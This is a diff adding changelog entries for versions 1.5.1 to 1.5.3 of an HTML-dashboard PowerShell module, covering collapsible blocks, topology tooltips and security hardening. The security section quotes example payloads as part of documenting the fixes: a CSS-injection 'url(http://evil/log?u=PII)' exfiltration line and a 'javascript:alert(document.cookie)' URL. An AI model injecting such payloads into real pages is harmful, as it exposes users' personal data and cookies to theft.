@@ -6,6 +6,61 @@ Versioning follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+## [1.5.3] — 2026-06-20
+
+Security hardening. Closes three concrete vectors flagged in the v1.5.2 audit. **No breaking changes** for any caller passing well-formed colours and URLs.
+
+### Security
+- **CSS injection via colour fields — closed.** `Add-DhPieChart` slice `Color` and `Add-DhLineChart` series `Color` are now validated through `Test-DhSafeCssColor` against a fixed allowlist (`#hex` 3/4/6/8 digit, `rgb()`/`rgba()`, `hsl()`/`hsla()`, `var(--token)`, single CSS named colour). Previously these strings were HTML-encoded but reached the inline `style="background: …"` markup with CSS metacharacters (`;`, `:`, `(`, `)`) intact, so a caller piping untrusted data into a colour could inject arbitrary CSS rules — including `background-image: url(http://evil/log?u=PII)` for data exfiltration.
+- **`javascript:` URL execution via Action.Url — closed.** `Add-DhAlertBanner -Action @{Url=…}` and `Add-DhSummary` tile `Action.Url` are now validated through `Test-DhSafeActionUrl`. Allowed schemes are `http:`, `https:`, `mailto:`, `tel:`, and a leading `#` (in-page anchor). Anything else throws at declaration time, preventing `javascript:alert(document.cookie)`-style payloads from reaching `window.open()` in the dashboard origin.
+- **CDN supply-chain attack — closed.** The three `<script>` tags loaded from cdnjs (`xlsx`, `jspdf`, `jspdf-autotable`) now carry SRI `integrity="sha384-…"` attributes pinned to the bundled library versions. A compromised CDN or HTTPS-MITM proxy can no longer swap the script body — the browser refuses to execute a tampered file. `referrerpolicy="no-referrer"` also added so the user's dashboard path isn't leaked to cdnjs on each load.
+
+### Changed
+- **`ConvertTo-DhJsonString` now escapes U+2028 / U+2029** as their explicit ` ` / ` ` JSON sequence. Modern JS engines accept these inside string literals (ES2019+), but older parsers, linters, and log forwarders treat them as raw line terminators and could break the embedded `<script>` block when a label value happened to contain one.
+- **Help text on `Add-DhTabs`, `Add-DhAlertBanner`, and `Add-DhCollapsible`** now carries the same explicit SECURITY note that `Add-DhHtmlBlock` already had, spelling out the raw-HTML / never-pass-untrusted-data contract. The four cmdlets behaved identically in 1.5.2 — only `Add-DhHtmlBlock` was documented as such. Callers piping `$user.Description` into `-Message`, `-Content`, or per-tab `Content` should now see the warning at `Get-Help` time.
+
+### Implementation
+- `Private/Test-DhSafeInput.ps1` (new) — exposes `Test-DhSafeCssColor` and `Test-DhSafeActionUrl`. Both throw on invalid input with a deterministic, descriptive message including the caller context. Auto-imported by the existing `Private/*.ps1` loader in `DashHtml.psm1`.
+- `Public/Add-DhPieChart.ps1`, `Public/Add-DhLineChart.ps1` — slice/series `Color` normalisation pipeline now routes through `Test-DhSafeCssColor`.
+- `Public/Add-DhAlertBanner.ps1`, `Public/Add-DhSummary.ps1` — `Action.Url` normalisation routes through `Test-DhSafeActionUrl` before the normalised hashtable is built.
+- `Public/Export-DhDashboard.ps1` — `<script>` tags for cdnjs scripts now include `integrity=` (computed against the exact bundled versions) and `referrerpolicy="no-referrer"`.
+- `Private/ConvertTo-DhJsonString.ps1` — final pass appends ` ` / ` ` escaping.
+
+### Tests
+- **14 new Pester scenarios** under five `Security:` Describe blocks. 322 tests total (was 308). New tests cover: PieChart Color allowlist (positive & negative cases including a literal CSS-injection payload), LineChart Color allowlist, AlertBanner `Action.Url` scheme allowlist (rejects `javascript:` and `data:`, accepts http/https/mailto/tel/#), Summary tile Action URL, `ConvertTo-DhJsonString` U+2028/U+2029 escape round-trip, and an end-to-end check that the generated HTML carries `integrity="sha384-…"` on all three CDN script tags.
+
+## [1.5.2] — 2026-06-19
+
+Topology map usability pass. Fully backward compatible; the new behaviour is opt-in via `-AutoFitWidth` on `Add-DhTopologyMap`, but the styled hover tooltip is on by default for every topology block (it replaces the OS-default `title` attribute that was already in use).
+
+### Added
+- **`-AutoFitWidth` switch + `-AutoFitMaxWidth` parameter on `Add-DhTopologyMap`** — when set, the JS renderer measures the widest label / icon / badge combination across all nodes using a hidden canvas and grows `NodeWidth` to fit, capped at `-AutoFitMaxWidth` (default 360 px). Removes the truncated-FQDN problem that hits wide-fan trees rendered at the 140 px default.
+- **Styled hover tooltip on every topology node** — a single body-level overlay positioned via JS surfaces either the explicit `Tooltip` (when supplied) or the node's full `Label` as a fallback. Replaces the OS-default tooltip, which was both slow to appear and unstyled. Works on SVG node groups (CSS `::after` / `::before` do not render on SVG elements, hence the body-level overlay approach).
+
+### Implementation
+- `Public/Add-DhTopologyMap.ps1` — new `[switch] $AutoFitWidth` and `[ValidateRange(140,600)] [int] $AutoFitMaxWidth = 360` parameters; both emitted in the block hashtable.
+- `Public/Export-DhDashboard.ps1` — `topologymap` JSON now carries `autoFitWidth` and `autoFitMaxWidth`.
+- `Private/Get-DhJsContent.ps1` — new `_topoMeasureText()` (lazy `<canvas>` instance), `_topoEnsureTooltip()` / `_topoShowTooltip()` / `_topoHideTooltip()` helpers. `renderTopologyMap()` runs the auto-fit pass on the global node set before layout (per-node would break the parent-centring maths) and wires `mouseenter` / `mousemove` / `mouseleave` / `focusin` / `focusout` on every `.topo-node`.
+- `Private/Get-DhCssBase.ps1` — new `.topo-tooltip` rule (fixed position, themed via existing tokens).
+
+## [1.5.1] — 2026-06-19
+
+Collapsible chrome now available on every block cmdlet (and on `Add-DhTable` and `Add-DhAlertBanner`), matching the `Add-DhSummary` pattern introduced in 1.3.2. Fully backward compatible at the parameter level; **default is `$true` per cmdlet so existing dashboards immediately gain folding headers**. Pass `-Collapsible:$false` per call to keep the flat 1.5.0 look.
+
+### Added
+- **`-Collapsible` and `-DefaultOpen` parameters on every block cmdlet** — `Add-DhBarChart`, `Add-DhBullet`, `Add-DhEventFeed`, `Add-DhFilterCard`, `Add-DhHeatmap`, `Add-DhHtmlBlock`, `Add-DhLineChart`, `Add-DhPieChart`, `Add-DhStatusGrid`, `Add-DhTabs`, `Add-DhTopologyMap`. Both default to `$true`. When enabled, the block's outer container becomes a `.collapsible-section` with a clickable header bar (chevron + click-to-toggle) using the same chrome as `Add-DhCollapsible` / `Add-DhSummary`. The inner renderer is unchanged — a new central JS helper `wrapCollapsibleBlock()` rewrites the host container before dispatch and strips the inner block's `title`/`icon` so they don't render twice.
+- **`-Collapsible`, `-DefaultOpen`, `-Icon` on `Add-DhTable`** — the existing `<section class="table-section">` now optionally hosts a clickable `<button class="table-section-toggle">` header above a foldable `.table-section-body` that wraps the toolbar, table, paging, and link badge. The outer `<section>` stays as the nav target so `showSubPanel()` routing is unaffected. The new `-Icon` parameter places an optional glyph next to the table title.
+- **`-Collapsible`, `-DefaultOpen`, `-Title` on `Add-DhAlertBanner`** — the banner gains a clickable header bar that folds the message body. Action + dismiss buttons stay outside the collapse so they remain reachable when the body is closed. `-Title` defaults to a severity-derived label (`'Alert'` / `'Notice'` / `'Warning'` / `'Critical'`).
+
+### Changed
+- **Default rendering is now collapsible** — this is a visible behaviour change for every existing dashboard. If a customer needs the pre-1.5.1 flat look, add `-Collapsible:$false` on each affected call. Tested against the existing 308 Pester scenarios; all pass with the new default.
+
+### Implementation
+- `Get-DhJsContent.ps1` — new `wrapCollapsibleBlock(outer, block)` helper and a refactored `renderBlocks()` central dispatcher. Block types that already own their own chrome (`'collapsible'`, `'summarystrip'`) are passed through unwrapped via a `_SELF_COLLAPSIBLE` lookup. New `initTableCollapsibles()` runs once at DOMContentLoaded to wire `.table-section-toggle` click handlers. `renderAlerts()` grows a `if (alert.collapsible) {…}` branch for the banner-specific wrap.
+- `Build-DhTableSections.ps1` — emits `<button class="table-section-toggle">` + `<div class="table-section-body">` wrappers when the table opted in.
+- `Get-DhCssBase.ps1` — new `.table-section-toggle` / `.table-section-body` / `.table-section-chevron` rules and `.alert-banner-collapsible` rules for the per-banner wrap.
+- `Export-DhDashboard.ps1` — single shared `$bCollStr` / `$bDoStr` pair computed once per block; appended to every block-emit line in the `switch ($b.BlockType)` (11 cases). Banner emit grows three new keys (`collapsible`, `defaultOpen`, `title`).
+
 ## [1.5.0] — 2026-05-25
 
 Tier A widget expansion: inline tabbed content, 2-D heatmaps, and parent-child topology trees. Closes out the three remaining spec widgets from the v1.4 plan (`docs/v1.4-plan.md`). Fully backward compatible.
